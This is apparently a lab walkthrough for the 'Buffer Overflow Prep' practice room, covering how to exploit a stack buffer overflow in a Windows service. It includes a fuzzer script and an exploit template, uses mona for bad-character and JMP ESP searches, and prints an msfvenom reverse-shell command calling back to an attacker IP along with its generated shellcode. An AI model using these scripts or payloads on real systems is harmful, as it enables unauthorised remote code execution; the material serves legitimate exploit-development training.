# Buffer Overflow Prep by Tib3rius

## Connecting to your `Immunity Debugger` machine

```bash
$ xfreerdp /u:admin /p:password /cert:ignore /v:$IP /smart-sizing:$WIDTHx$HEIGHT
```

where `$IP` is the IP address of the machine, `$WIDTH` and `$HEIGHT` is the width and height of your screen.

## Configuring `mona`

**Remember to `run as Administrator`!**

```bash
!mona config -set workingfolder c:\mona\%p
```

If your binary is called `oscp.exe`, your `bytearray.bin` and other files will be stored in `C:\mona\oscp\`.

## Running the binary as a Windows Service

### Identifying the name of the service

```bash
sc queryex type=service state=all | find /i "SERVICE_NAME:"
```

### Starting the service

```bash
sc start <service_name>
```

### Attach `Immunity Debugger` to the process

**Remember to `run as Administrator`!**

```bash
File -> Attach
Debug -> Run
```

### Restarting the process

```bash
sc stop <service_name>
sc start <service_name>
```

## Running the binary standalone

### Spawn the process from `Immunity Debugger`

**Remember to `run as Administrator`!**

```bash
File -> Open
Debug -> Run
```

## Fuzzing 

`fuzzer.py`:  
```python
#!/usr/bin/python2

import socket, time, sys

ip = "10.10.85.204"
port = 1337
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send("OVERFLOW1 " + string + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```

```bash
$ python2 fuzzer.py
...
Fuzzing with 1900 bytes
Fuzzing with 2000 bytes                <- Take note of the largest count 
Could not connect to 10.10.85.204:1337
```

## Crash Replication & Controlling EIP

`exploit.py`:
```python
#!/usr/bin/python2

import socket

ip = "10.10.85.204"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

Generating pattern:

```bash
$ msf-pattern_create -l 2000 
Aa0Aa1Aa2...                 <- Insert into the "payload" variable
```

Get the offset:
```bash
!mona findmsp -distance 2000
```

![](/images/bof1.png)

```bash
EIP contains normal pattern : ... (offset 1978)    <- Insert into the "offset" variable.

Set the "payload" variable to an empty string and set the "retn" variable to "BBBB".

Run again to verify that EIP has been overridden with "BBBB".
```

## Finding Bad Characters

`badchars.py`:  
```python
#!/usr/bin/python2

from __future__ import print_function

for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')

print()

"""
Add the following to the "payload" variable

\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff 
"""
```

(1) Generate `bytearray.bin` and specifying currently known bad characters

```bash
!mona bytearray -b "\x00"
```

(2) Run `exploit.py` again.

(3) Replace `<esp_address>` with the `ESP` value and add next bad char to list of known bad characters.

```bash
!mona compare -f C:\mona\oscp\bytearray.bin -a <esp_address>
```

(4) Remove bad char from the "`payload`" variable.

(5) Repeart from (1) until no more bad characters reported

![](/images/bof2.png)

## Finding a Jump Point

Find suitable `JMP ESP` instruction and specifying currently known bad characters

```bash
!mona jmp -r esp -cpb "\x00"
```

![](/images/bof3.png)

Set the "`retn`" variable to chosen address in little-endian.

## Generating Payload

```bash
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.8.87.140 LPORT=1337 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f py
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of py file: 1712 bytes
buf =  b""
buf += b"\xd9\xc7\xd9\x74\x24\xf4\xbf\xcc\x83\x01\xb7\x5a\x33"
buf += b"\xc9\xb1\x52\x31\x7a\x17\x83\xea\xfc\x03\xb6\x90\xe3"
buf += b"\x42\xba\x7f\x61\xac\x42\x80\x06\x24\xa7\xb1\x06\x52"
buf += b"\xac\xe2\xb6\x10\xe0\x0e\x3c\x74\x10\x84\x30\x51\x17"
buf += b"\x2d\xfe\x87\x16\xae\x53\xfb\x39\x2c\xae\x28\x99\x0d"
buf += b"\x61\x3d\xd8\x4a\x9c\xcc\x88\x03\xea\x63\x3c\x27\xa6"
buf += b"\xbf\xb7\x7b\x26\xb8\x24\xcb\x49\xe9\xfb\x47\x10\x29"
buf += b"\xfa\x84\x28\x60\xe4\xc9\x15\x3a\x9f\x3a\xe1\xbd\x49"
buf += b"\x73\x0a\x11\xb4\xbb\xf9\x6b\xf1\x7c\xe2\x19\x0b\x7f"
buf += b"\x9f\x19\xc8\xfd\x7b\xaf\xca\xa6\x08\x17\x36\x56\xdc"
buf += b"\xce\xbd\x54\xa9\x85\x99\x78\x2c\x49\x92\x85\xa5\x6c"
buf += b"\x74\x0c\xfd\x4a\x50\x54\xa5\xf3\xc1\x30\x08\x0b\x11"
buf += b"\x9b\xf5\xa9\x5a\x36\xe1\xc3\x01\x5f\xc6\xe9\xb9\x9f"
buf += b"\x40\x79\xca\xad\xcf\xd1\x44\x9e\x98\xff\x93\xe1\xb2"
buf += b"\xb8\x0b\x1c\x3d\xb9\x02\xdb\x69\xe9\x3c\xca\x11\x62"
buf += b"\xbc\xf3\xc7\x25\xec\x5b\xb8\x85\x5c\x1c\x68\x6e\xb6"
buf += b"\x93\x57\x8e\xb9\x79\xf0\x25\x40\xea\xf5\xb1\x1d\x66"
buf += b"\x61\xc0\xa1\x73\x4b\x4d\x47\x11\xbb\x1b\xd0\x8e\x22"
buf += b"\x06\xaa\x2f\xaa\x9c\xd7\x70\x20\x13\x28\x3e\xc1\x5e"
buf += b"\x3a\xd7\x21\x15\x60\x7e\x3d\x83\x0c\x1c\xac\x48\xcc"
buf += b"\x6b\xcd\xc6\x9b\x3c\x23\x1f\x49\xd1\x1a\x89\x6f\x28"
buf += b"\xfa\xf2\x2b\xf7\x3f\xfc\xb2\x7a\x7b\xda\xa4\x42\x84"
buf += b"\x66\x90\x1a\xd3\x30\x4e\xdd\x8d\xf2\x38\xb7\x62\x5d"
buf += b"\xac\x4e\x49\x5e\xaa\x4e\x84\x28\x52\xfe\x71\x6d\x6d"
buf += b"\xcf\x15\x79\x16\x2d\x86\x86\xcd\xf5\xa6\x64\xc7\x03"
buf += b"\x4f\x31\x82\xa9\x12\xc2\x79\xed\x2a\x41\x8b\x8e\xc8"
buf += b"\x59\xfe\x8b\x95\xdd\x13\xe6\x86\x8b\x13\x55\xa6\x99"
```

Copy the output into the `exploit.py` and equate the "`payload`" variable to the "`buf`" variable.

Set the "`padding`" variable to `\x90" * 16`.


## `Immunity Debugger` Shortcuts

```bash
Ctrl+F2   Re-open the binary
F9        Run
```